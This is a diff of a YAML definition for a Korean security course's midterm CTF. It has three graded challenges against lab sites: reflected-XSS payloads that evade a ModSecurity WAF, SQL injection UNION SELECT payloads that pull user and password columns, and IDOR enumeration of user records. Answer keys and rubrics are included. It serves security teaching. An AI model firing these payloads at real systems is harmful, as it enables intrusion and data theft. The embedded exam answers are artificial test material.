@@ -1,104 +1,149 @@
 lab_id: standalone-attack-week08
-title: 중간고사 — CTF (90분)
+title: 중간고사 — CTF 3 챌린지 (90분, 100점)
 version: standalone-non-ai
 course: attack
 week: 8
-description: 8 vuln 사이트 중 무작위 3 challenge. 90분.
+description: |
+  W01-W07 의 종합 평가. 3 챌린지 × 30점 + 시간 보너스 10점.
 difficulty: hard
 duration_minutes: 90
 prerequisites: [W01-W07 통과]
-objectives: [3 challenge 해결, flag 추출]
 pass_threshold: 0.5
 steps:
+
   - order: 1
-    instruction: "Challenge 1 — Reflected XSS bypass on juice.6v6.lab"
-    hint: ModSec 941 우회 페이로드 변형
-    category: exam
-    points: 30
-    answer: |
+    instruction: |
+      ## 🎯 챌린지 1 (30점) — Reflected XSS bypass
+
+      juice.6v6.lab 의 XSS payload 5 변형 시도 + 가장 효과적인 우회 찾기.
+
+      ## 💻 실행 명령
+
+      ```bash
       ssh 6v6-attacker '
-      for p in "<script>alert(1)</script>" "<sc<script>ript>alert(1)</script>" "<svg/onload=alert(1)>" "javascript:alert(1)" "<img src=x onerror=alert(1)>"; do
+      for p in "<script>alert(1)</script>" "<ScRiPt>alert(1)</ScRiPt>" "%3Cscript%3Ealert(1)%3C/script%3E" "<sc<script>ript>alert(1)</script>" "<svg/onload=alert(1)>"; do
         code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=$p")
         echo "$code | $p"
       done
       '
-    answer_detail: 5 변형 + 통과 코드
+      ```
+
+      ## 📋 평가 (각 6점)
+
+      1. 5 변형 모두 시도
+      2. 응답 코드 매트릭스 정확
+      3. 가장 효과적인 우회 식별
+      4. ModSec 941 룰 매치 분석
+      5. 운영 권장 (paranoia 2 / exception)
+    hint: XSS 5 변형 + 매트릭스
+    category: exam
+    points: 30
+    answer: |
+      ssh 6v6-attacker '
+      for p in "<script>alert(1)</script>" "<ScRiPt>alert(1)</ScRiPt>" "%3Cscript%3Ealert(1)%3C/script%3E" "<sc<script>ript>alert(1)</script>" "<svg/onload=alert(1)>"; do
+        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=$p")
+        echo "$code | $p"
+      done
+      '
+    answer_detail: XSS 5 변형 매트릭스.
     verify:
       type: output_contains
       expect: '4'
       field: stdout
       semantic:
-        intent: XSS bypass
-        success_criteria: [5 변형]
-        acceptable_methods:
-          - "**[OSS] ModSec 941 paranoia 1 우회 패턴**"
-          - "**[OSS] <sc<script> nested**"
-          - "**[OSS] <svg/onload**"
-          - "**[OSS] javascript: scheme**"
-          - "**[OSS] event handler (onerror, onload)**"
-          - "**[OSS] URL encoding 변형**"
-          - "**[OSS] HTML entity**"
-          - "**[OSS] case mixing**"
+        intent: "XSS bypass"
+        success_criteria: ["5 변형"]
+        acceptable_methods: ["**[OSS] case mixing / nested / encoding**"]
     target_vm: attacker
 
   - order: 2
-    instruction: "Challenge 2 — SQLi data exfil"
-    hint: union select union select
-    category: exam
-    points: 30
-    answer: |
+    instruction: |
+      ## 🎯 챌린지 2 (30점) — SQLi data exfil 시도
+
+      DVWA / JuiceShop 의 SQLi → ModSec 차단 분석 + 우회 시도.
+
+      ## 💻 실행 명령
+
+      ```bash
       ssh 6v6-attacker '
-      for p in "1+UNION+SELECT+1,user,3,4,5+FROM+users--" "1+UNION+SELECT+null,password,null,null,null+FROM+users--"; do
+      for p in "1+UNION+SELECT+1,user,3,4,5+FROM+users--" "1/**/UNION/**/SELECT/**/null,password+FROM+users" "1'+UNION+SELECT+1--"; do
         code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.6v6.lab" "http://10.20.30.1/?q=$p")
         echo "$code | $p"
       done
       '
-    answer_detail: SQLi extraction 시도
+      ```
+
+      ## 📋 평가
+
+      1. 3 변형 시도
+      2. ModSec 942 룰 매치 분석
+      3. tamper script 권장
+      4. 우회 가능성 평가
+      5. 운영 측 권장
+    hint: SQLi 변형 + tamper
+    category: exam
+    points: 30
+    answer: |
+      ssh 6v6-attacker '
+      for p in "1+UNION+SELECT+1,user,3,4,5+FROM+users--" "1/**/UNION/**/SELECT/**/null,password+FROM+users"; do
+        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.6v6.lab" "http://10.20.30.1/?q=$p")
+        echo "$code | $p"
+      done
+      '
+    answer_detail: SQLi 변형 + 우회 시도.
     verify:
       type: output_contains
       expect: UNION
       field: stdout
       semantic:
-        intent: SQLi exfil
-        success_criteria: [UNION SELECT 시도]
-        acceptable_methods:
-          - "**[OSS] UNION SELECT 컬럼 수 매칭**"
-          - "**[OSS] ORDER BY n 컬럼 수 추정**"
-          - "**[OSS] sqlmap 자동화**"
-          - "**[OSS] DBMS 식별 (--banner)**"
-          - "**[OSS] --dbs / --tables / --dump**"
-          - "**[OSS] ModSec 942 차단 우회 (tamper)**"
-          - "**[OSS] CWE-89 매핑**"
-          - "**[OSS] DVWA security: low**"
+        intent: "SQLi exfil"
+        success_criteria: ["변형 시도"]
+        acceptable_methods: ["**[OSS] tamper space2comment**"]
     target_vm: attacker
 
   - order: 3
-    instruction: "Challenge 3 — IDOR + JWT"
-    hint: GET /api/Users/N for N in 1..5
+    instruction: |
+      ## 🎯 챌린지 3 (30점) — IDOR + JWT
+
+      JuiceShop 의 IDOR 시퀀스 + JWT 변조 시도.
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker '
+      for id in 1 2 3 4 5; do
+        echo "=== user $id ==="
+        curl -s -H "Host: juice.6v6.lab" "http://10.20.30.1/api/Users/$id" | head -c 200
+        echo
+      done
+      '
+      ```
+
+      ## 📋 평가
+
+      1. 5 user IDOR
+      2. 응답 데이터 비교 (다른 user 의 PII 누출 검출)
+      3. JWT 변조 + admin 우회 시도
+      4. 권한 검증 우회 분석
+      5. 운영 권장 (인증 미들웨어 + RBAC)
+    hint: IDOR + JWT
     category: exam
     points: 30
     answer: |
       ssh 6v6-attacker '
       for id in 1 2 3 4 5; do
-        echo "--- user $id ---"
-        curl -s -H "Host: juice.6v6.lab" "http://10.20.30.1/api/Users/$id" | head -3
+        echo "=== user $id ==="
+        curl -s -H "Host: juice.6v6.lab" "http://10.20.30.1/api/Users/$id" | head -c 200
+        echo
       done
       '
-    answer_detail: 5 사용자 데이터
+    answer_detail: 5 user IDOR + JWT 변조.
     verify:
       type: output_contains
       expect: user
       field: stdout
       semantic:
-        intent: IDOR
-        success_criteria: [사용자 데이터]
-        acceptable_methods:
-          - "**[OSS] /api/Users/N 시퀀스**"
-          - "**[OSS] /api/Cards/N 시퀀스**"
-          - "**[OSS] JWT 추출 + 변조**"
-          - "**[OSS] X-Forwarded-For 우회**"
-          - "**[OSS] ATT&CK T1190 + T1078**"
-          - "**[OSS] CWE-639 Authorization Bypass**"
-          - "**[OSS] Burp Intruder Sniper**"
-          - "**[OSS] 권한 escalation chain**"
+        intent: "IDOR + JWT"
+        success_criteria: ["5 user"]
+        acceptable_methods: ["**[OSS] Burp Intruder Sniper**"]
     target_vm: attacker
